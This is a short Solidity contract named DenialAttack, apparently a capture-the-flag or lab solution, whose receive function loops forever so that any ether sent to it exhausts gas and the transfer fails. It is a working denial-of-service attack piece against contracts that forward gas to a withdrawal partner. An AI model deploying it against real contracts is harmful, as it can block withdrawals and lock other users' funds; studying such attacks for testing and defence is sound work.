// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

contract DenialAttack {
    receive() external payable {
        while (true) {}
    }
}
